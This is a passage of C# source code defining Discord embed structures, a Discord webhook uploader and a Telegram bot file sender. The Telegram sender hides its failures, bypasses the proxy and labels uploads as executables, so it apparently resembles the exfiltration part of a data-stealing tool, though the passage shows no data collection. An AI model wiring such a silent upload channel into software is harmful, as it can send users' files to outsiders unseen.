            /// </summary>
            public string Description;

            /// <summary>
            /// Embed url
            /// </summary>
            public string Url;

            /// <summary>
            /// Embed timestamp
            /// </summary>
            public DateTime? Timestamp;

            /// <summary>
            /// Embed color
            /// </summary>
            public Color? Color;

            /// <summary>
            /// Embed footer
            /// </summary>
            public EmbedFooter? Footer;

            /// <summary>
            /// Embed image
            /// </summary>
            public EmbedMedia? Image;

            /// <summary>
            /// Embed thumbnail
            /// </summary>
            public EmbedMedia? Thumbnail;

            /// <summary>
            /// Embed video
            /// </summary>
            public EmbedMedia? Video;

            /// <summary>
            /// Embed provider
            /// </summary>
            public EmbedProvider? Provider;

            /// <summary>
            /// Embed author
            /// </summary>
            public EmbedAuthor? Author;

            /// <summary>
            /// Embed fields list
            /// </summary>
            public List<EmbedField> Fields;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Discord embed footer data object
        /// </summary>
        public struct EmbedFooter
        {
            /// <summary>
            /// Footer text
            /// </summary>
            public string Text;

            /// <summary>
            /// Footer icon
            /// </summary>
            public string IconUrl;

            /// <summary>
            /// Footer icon proxy
            /// </summary>
            public string ProxyIconUrl;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Discord embed media data object (images/thumbs/videos)
        /// </summary>
        public struct EmbedMedia
        {
            /// <summary>
            /// Media url
            /// </summary>
            public string Url;

            /// <summary>
            /// Media proxy url
            /// </summary>
            public string ProxyUrl;

            /// <summary>
            /// Media height
            /// </summary>
            public int? Height;

            /// <summary>
            /// Media width
            /// </summary>
            public int? Width;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Discord embed provider data object
        /// </summary>
        public struct EmbedProvider
        {
            /// <summary>
            /// Provider name
            /// </summary>
            public string Name;

            /// <summary>
            /// Provider url
            /// </summary>
            public string Url;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Discord embed author data object
        /// </summary>
        public struct EmbedAuthor
        {
            /// <summary>
            /// Author name
            /// </summary>
            public string Name;

            /// <summary>
            /// Author url
            /// </summary>
            public string Url;

            /// <summary>
            /// Author icon
            /// </summary>
            public string IconUrl;

            /// <summary>
            /// Author icon proxy
            /// </summary>
            public string ProxyIconUrl;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Discord embed field data object
        /// </summary>
        public struct EmbedField
        {
            /// <summary>
            /// Field name
            /// </summary>
            public string Name;

            /// <summary>
            /// Field value
            /// </summary>
            public string Value;

            /// <summary>
            /// Field align
            /// </summary>
            public bool InLine;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Webhook url
        /// </summary>
        public string Url { get; private set; }
        public bool Enabled;

        public DiscordWebhook(string url)
        {
            if (Uri.TryCreate(url, UriKind.Absolute, out Uri uri))
            {
                this.Url = url;
                this.Enabled = true;
            }
        }

        private void AddField(MemoryStream stream, string bound, string cDisposition, string cType, byte[] data)
        {
            string prefix = stream.Length > 0 ? "\r\n--" : "--";
            string fBegin = $"{prefix}{bound}\r\n";

            byte[] fBeginBuffer = Utils.Encode(fBegin);
            byte[] cDispositionBuffer = Utils.Encode(cDisposition);
            byte[] cTypeBuffer = Utils.Encode(cType);

            stream.Write(fBeginBuffer, 0, fBeginBuffer.Length);
            stream.Write(cDispositionBuffer, 0, cDispositionBuffer.Length);
            stream.Write(cTypeBuffer, 0, cTypeBuffer.Length);
            stream.Write(data, 0, data.Length);
        }

        private void SetJsonPayload(MemoryStream stream, string bound, string json)
        {
            string cDisposition = "Content-Disposition: form-data; name=\"payload_json\"\r\n";
            string cType = "Content-Type: application/octet-stream\r\n\r\n";
            AddField(stream, bound, cDisposition, cType, Utils.Encode(json));
        }

        private void SetFile(MemoryStream stream, string bound, int index, FileInfo file)
        {
            string cDisposition = $"Content-Disposition: form-data; name=\"file_{index}\"; filename=\"{file.Name}\"\r\n";
            string cType = "Content-Type: application/octet-stream\r\n\r\n";
            AddField(stream, bound, cDisposition, cType, File.ReadAllBytes(file.FullName));
        }

        /// <summary>
        /// Send webhook message
        /// </summary>
        public void Send(DiscordMessage message, params FileInfo[] files)
        {
            if (!this.Enabled)
                return;

            if (string.IsNullOrEmpty(Url))
                throw new ArgumentNullException("Invalid Webhook URL.");

            string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
            WebClient webhookRequest = new WebClient();
            webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);

            MemoryStream stream = new MemoryStream();
            for (int i = 0; i < files.Length; i++)
                SetFile(stream, bound, i, files[i]);

            string json = message.ToString();
            SetJsonPayload(stream, bound, json);

            byte[] bodyEnd = Utils.Encode($"\r\n--{bound}--");
            stream.Write(bodyEnd, 0, bodyEnd.Length);

            try
            {
                webhookRequest.UploadData(this.Url, stream.ToArray());
            }
            catch (WebException ex)
            {
                throw new WebException(Utils.Decode(ex.Response.GetResponseStream()));
            }

            stream.Dispose();
        }
    }

    public class TelegramAPI
    {
        public bool Enabled;
        public ulong ChatId;
        public string Token;
        private string Endpoint = "https://api.telegram.org/bot";

        public TelegramAPI(string Token, ulong ChatId)
        {
            if (Token.Length == 46 && Token.Contains(":") && ChatId.ToString().Length >= 9)
            {
                this.ChatId = ChatId;
                this.Token = Token;
                this.Endpoint += $"{Token}/sendDocument?chat_id={ChatId}";
                Enabled = true;
            }
        }

        public void Send(byte[] fileData, string fileName, string content)
        {
            if (!this.Enabled)
                return;

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                WebClient webClient = new WebClient
                {
                    Proxy = null
                };

                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
                string @string = webClient.Encoding.GetString(fileData);
                string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                {
                    boundary,
                    fileName,
                    "application/x-ms-dos-executable",
                    @string
                });

                byte[] bytes = webClient.Encoding.GetBytes(s);
                webClient.UploadData(!string.IsNullOrEmpty(content) ? this.Endpoint + $"&parse_mode=markdown&caption={content}" : this.Endpoint, "POST", bytes);
            }
            catch (Exception)
            {

            }
        }
    }
}
